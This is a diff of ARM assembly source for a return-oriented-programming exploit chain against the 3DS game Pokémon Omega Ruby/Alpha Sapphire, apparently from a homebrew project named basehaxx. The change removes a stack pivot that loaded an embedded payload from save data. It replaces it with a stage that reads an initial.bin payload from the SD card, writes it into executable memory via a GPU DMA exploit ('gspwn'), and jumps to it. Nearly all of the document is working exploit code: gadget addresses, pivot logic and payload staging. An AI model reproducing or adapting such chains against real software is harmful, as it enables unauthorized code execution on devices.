@@ -1,35 +1,18 @@
-.open "../oras_code/oras_code.bin",0x0
-	initial_payload_size:
-		.incbin "../oras_code/oras_code.bin"
-	initial_payload_size_end:
-.close
-
 .nds
 
 .include "oras_constants.s"
 .include "oras_macros.s"
 
-.create "../build/rop.bin",ORAS_SAVE_PICDATA_BUFFER_PTR
+.create "../build/rop_stage1.bin",ORAS_SAVE_OWNERNAME_PTR+ORAS_STAGE1_OFFSET
 
-rop:
-
-	; PIVOT
-	.word ORAS_1ST_JMP_PTR ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PREPIVOT
-	.word ORAS_PREPIVOT ; 1st jump, allows us to load the value stored at r0+0x8 in r2, when we jump r0=ORAS_1ST_JMP_PTR so ORAS_ROP_START is loaded in r2
-	.word ORAS_ROP_START ; the address in RAM where the rop start
-	.word 0x0
-	.word ORAS_2ND_JMP_PTR ; this point to the address where it is stored in RAM, the game dereference this+0x4 and jump to it so it jumps to ORAS_PREPIVOT
-	.word ORAS_PIVOT ; move r2 to sp 
-					 ; then load the value stored at r0 in r2, so ORAS_2ND_JMP_PTR is stored in r2
-					 ; then load the value stored at r2+0x10 in r2, so ROP_ORAS_NOP is stored in r2
-					 ; then it jumps to r2
-	.word 0x0
-	.word 0x0
-	.word ROP_ORAS_NOP
-
-.fill (ORAS_ROP_START - .),0x0
-
-	; ROP
+; ROP
+rop:	
+	.word ROP_ORAS_POP_R1PC
+		.word ROP_ORAS_NOP ; prepare jump for next gadget
+	.word ROP_ORAS_MOV_R0R9_BLX_R1 ; move file handle to r0 and then jump to next gadget
+	
+	store_r0_to file_handle
+	FSFILE_Close file_handle ; close stage1 rop.bin file handle 
 	
 	deref_to_r0_and_sub ORAS_APPMEMTYPE_PTR, 0x6 ; get the appmemtype,
 												 ; I don't know why but it takes much more time when trying to directly 
@@ -87,16 +70,35 @@ rop:
 		
 	loop_end:
 	
-	memcpy LINEAR_BUFFER, ORAS_SAVE_PICDATA_BUFFER_PTR + (rop_end - rop), initial_payload_size_end - initial_payload_size
+	;memcpy LINEAR_BUFFER, ORAS_SAVE_PICDATA_BUFFER_PTR + (rop_end - rop), initial_payload_size_end - initial_payload_size
+	FSUSER_OpenFileDirectly file_handle, 0x0, ARCH_SDMC, PATH_EMPTY, empty_string, 0x1, PATH_ASCII, initial_path, initial_path_end-initial_path, FS_OPEN_READ, 0x0
+	FSFILE_GetSize file_handle, file_size
+	FSFILE_Read file_handle, 0, 0, dest_and_size, bytes_read
+	FSFILE_Close file_handle
+	
 	flush_dcache LINEAR_BUFFER, 0x00100000
 	gspwn loop_src, 0, LINEAR_BUFFER, 0x4000
 	
 	sleep 200*1000*1000, 0
 	
-	.word INITIAL_PAYLOAD_VA
+	.word INITIAL_PAYLOAD_VA	
 	
-	.word 0xDEAF0000	
+	file_handle:
+		.word 0x0
+	empty_string:
+		.word 0x0
+		
+	dest_and_size:
+		.word LINEAR_BUFFER
+		file_size:
+			.word 0x0
 	
+	initial_path:
+		.ascii "/basehaxx/", ORAS_VERSION, "/initial.bin", 0
+	initial_path_end:
+	
+	bytes_read:
+		.word 0x0
 rop_end:
 
 .close
